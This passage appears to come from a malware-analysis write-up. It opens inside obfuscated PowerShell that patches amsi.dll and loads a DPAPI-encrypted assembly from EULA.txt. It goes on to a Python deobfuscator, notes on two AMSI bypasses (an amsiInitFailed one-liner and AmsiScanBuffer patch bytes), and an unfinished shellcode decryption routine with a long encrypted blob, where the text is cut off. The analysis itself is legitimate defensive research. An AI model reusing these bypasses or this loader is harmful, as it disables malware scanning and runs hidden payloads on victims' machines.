)+[char](217-107)+[char](210-109)+[char](213-105)+[char](155-104)+[char](99-49)+[char](154-120)+[char](157-113)+[char](87-55)+[char](125-56)+[char](218-108)+[char](166-50)+[char](221-107)+[char](170-49)+[char](182-102)+[char](233-122)+[char](219-114)+[char](166-56)+[char](165-49)+[char](166-105)+[char](146-112)+[char](193-117)+[char](162-51)+[char](150-53)+[char](153-53)+[char](131-55)+[char](160-55)+[char](146-48)+[char](234-120)+[char](148-51)+[char](221-107)+[char](223-102)+[char](145-111)+[char](154-113)+[char](190-97)+[char](124-111)+[char](127-117)+[char](136-104)+[char](132-100)+[char](154-122)+[char](80-48)+[char](216-104)+[char](165-48)+[char](201-103)+[char](210-102)+[char](219-114)+[char](209-110)+[char](84-52)+[char](235-120)+[char](235-119)+[char](219-122)+[char](233-117)+[char](218-113)+[char](151-52)+[char](131-99)+[char](155-54)+[char](173-53)+[char](233-117)+[char](206-105)+[char](223-109)+[char](222-112)+[char](89-57)+[char](187-114)+[char](220-110)+[char](214-98)+[char](202-122)+[char](222-106)+[char](221-107)+[char](136-104)+[char](184-97)+[char](211-111)+[char](198-101)+[char](137-49)+[char](164-54)+[char](172-101)+[char](206-103)+[char](218-110)+[char](129-56)+[char](222-108)+[char](222-113)+[char](226-107)+[char](133-55)+[char](169-53)+[char](175-110)+[char](96-56)+[char](218-103)+[char](217-101)+[char](227-113)+[char](203-98)+[char](212-102)+[char](151-48)+[char](140-108)+[char](162-52)+[char](216-119)+[char](224-115)+[char](215-114)+[char](92-51)+[char](181-122)+[char](61-48)+[char](107-97)+[char](119-106)+[char](108-98)+[char](81-49)+[char](136-104)+[char](87-55)+[char](146-114)+[char](190-99)+[char](168-100)+[char](228-120)+[char](209-101)+[char](128-55)+[char](216-107)+[char](215-103)+[char](211-100)+[char](162-48)+[char](217-101)+[char](97-57)+[char](154-120)+[char](220-113)+[char](221-120)+[char](162-48)+[char](209-99)+[char](157-56)+[char](228-120)+[char](99-48)+[char](162-112)+[char](87-53)+[char](163-119)+[char](131-99)+[char](186-117)+[char](232-122)+[char](216-100)+[char](223-109)+[char](178-57)+[char](192-112)+[char](218-107)+[char](221-116)+[char](167-57)+[char](166-50)+[char](179-118)+[char](86-52)+[char](142-56)+[char](153-48)+[char](211-97)+[char](215-99)+[char](237-120)+[char](206-109)+[char](220-112)+[char](136-56)+[char](223-109)+[char](211-100)+[char](170-54)+[char](214-113)+[char](200-101)+[char](225-109)+[char](133-99)+[char](150-109)+[char](212-119)+[char](123-110)+[char](118-108)+[char](85-53)+[char](80-48)+[char](145-113)+[char](81-49)+[char](210-98)+[char](231-114)+[char](198-100)+[char](217-109)+[char](202-97)+[char](213-114)+[char](147-115)+[char](164-49)+[char](218-102)+[char](147-50)+[char](235-119)+[char](215-110)+[char](210-111)+[char](144-112)+[char](198-97)+[char](221-101)+[char](214-98)+[char](220-119)+[char](214-100)+[char](163-53)+[char](154-122)+[char](208-110)+[char](167-56)+[char](220-109)+[char](158-50)+[char](89-57)+[char](237-116)+[char](158-56)+[char](181-113)+[char](221-117)+[char](237-119)+[char](169-102)+[char](219-122)+[char](123-51)+[char](171-57)+[char](182-113)+[char](229-121)+[char](156-55)+[char](123-49)+[char](186-103)+[char](144-54)+[char](144-104)+[char](130-57)+[char](165-55)+[char](226-110)+[char](135-55)+[char](238-122)+[char](170-56)+[char](87-55)+[char](162-54)+[char](209-97)+[char](163-98)+[char](156-56)+[char](197-97)+[char](225-111)+[char](149-48)+[char](235-120)+[char](212-97)+[char](156-112)+[char](152-120)+[char](182-97)+[char](121-48)+[char](213-103)+[char](164-48)+[char](182-102)+[char](228-112)+[char](223-109)+[char](80-48)+[char](203-103)+[char](171-52)+[char](187-104)+[char](206-101)+[char](225-103)+[char](205-104)+[char](163-119)+[char](89-57)+[char](224-107)+[char](155-50)+[char](231-121)+[char](168-52)+[char](142-110)+[char](216-114)+[char](207-99)+[char](133-55)+[char](222-121)+[char](220-101)+[char](129-49)+[char](219-105)+[char](159-48)+[char](228-112)+[char](199-98)+[char](155-56)+[char](167-51)+[char](95-51)+[char](140-108)+[char](222-111)+[char](169-52)+[char](170-54)+[char](83-51)+[char](171-54)+[char](217-112)+[char](158-48)+[char](235-119)+[char](131-99)+[char](213-105)+[char](232-120)+[char](215-113)+[char](229-121)+[char](178-99)+[char](214-106)+[char](154-54)+[char](181-101)+[char](225-111)+[char](221-110)+[char](173-57)+[char](156-55)+[char](216-117)+[char](213-97)+[char](140-99)+[char](157-98)+[char](129-116)+[char](114-104)+[char](125-112)+[char](125-115)+[char](238-113)+[char](61-48)+[char](118-108)) Add-Type $ji1bl04dnkgt $r3elp5v1nu2j = [qCnvwtilNFpAUbx]::WdaXnGglIrmwNtA($uxh90d48.$be718nho.$3561ig2l($([char](149-52)+[char](220-111))) + $uxh90d48.$be718nho.$3561ig2l($([char](169-54)+[char](222-117)+[char](163-117)+[char](203-103)+[char](208-100)+[char](218-110)))) $38l4iohtap15 = [qCnvwtilNFpAUbx]::yiQVAZMXbBpSasE($r3elp5v1nu2j, $uxh90d48.$be718nho.$3561ig2l($([char](164-99)+[char](209-100)+[char](217-102)+[char](204-99))) + $uxh90d48.$be718nho.$3561ig2l($([char](132-49)+[char](203-104)+[char](217-120)+[char](215-105))) + $uxh90d48.$be718nho.$3561ig2l($([char](187-121)+[char](235-118)+[char](200-98)+[char](215-113)+[char](211-110)+[char](212-98)))) $5e6xtvfh71q3 = 0 [qCnvwtilNFpAUbx]::yfDhvCaHrEleJSZ($38l4iohtap15, [uint32]5, (118-54), [ref]$5e6xtvfh71q3) $chfdgmzksnri = [Byte[]] ((232-48), (140-53), (117-117), (114-107), (232-104), (298-103)) [IprQufkoUhvweiS]::Copy($chfdgmzksnri, 0, $38l4iohtap15, 6) Add-Type -AssemblyName System.Security $plo=Get-Content &quot;EULA.txt&quot; -Encoding Byte -ReadCount 0 $decryptedBytes = [System.Security.Cryptography.ProtectedData]::UnProtect( $plo, $null, [System.Security.Cryptography.DataProtectionScope]::Localmachine) $a=[System.Reflection.Assembly]::Load($decryptedBytes) [string[]]$string=$null $a.EntryPoint.Invoke($null, $null) &#39;&#39;&#39; import re def replace_obfuscated_chars(match): char_code = match.group(1) if &#39;-&#39; in char_code: parts = char_code.split(&#39;-&#39;) char_code = str(int(parts[0]) - int(parts[1])) return chr(int(char_code)) pattern = r&quot; [char ] (((?: d+- d+)|(?: d+)) ) +?&quot; deobfuscated_code = re.sub(pattern, replace_obfuscated_chars, ss) expression_pattern = r&quot; [char ]( d+) +?&quot; deobfuscated_code = re.sub(expression_pattern, lambda match: chr(int(match.group(1))),deobfuscated_code) arithmetic_pattern = r&quot; (( d+)-( d+) )&quot; deobfuscated_code = re.sub(arithmetic_pattern, lambda match: str(int(match.group(1)) - int(match.group(2))), deobfuscated_code) print(deobfuscated_code) . PowerShell AMSI Bypass . There are two bypasses in this script, the first is a simple variation of setting the amsiInitFailed value to True. . [Ref].Assembly.GetType(‚ÄòSystem.Management.Automation.AmsiUtils‚Äô).GetField(‚ÄòamsiInitFailed‚Äô,‚ÄôNonPublic,Static‚Äô).SetValue($null,$true) . The second bypass involves patching the AmsiScanBuffer of amsi.dll with the following bytes b8 57 00 07 80 c3. . mov eax, 0x80070057 ret . This returns the error code ERROR_INVALID_PARAMETER when the AmsiScanBuffer is called. . Shellcode . After the AMSI bypass code there is a large string that looks like base64 which is decrypted and loaded as shellcode using the EnumWindowStationsW callback. . 564eeea6e93af9f98e6a3e6910ce5d0e06866ef555c13150c82b15c59e4020a1 . TBD: Shellcode analysis . Shellcode Decryption . The following static shellcode decryption has been implemented by @oopsmishap. His notes can be found here _hellowrold.ipynb . import base64 from malduck import gzip data = &quot;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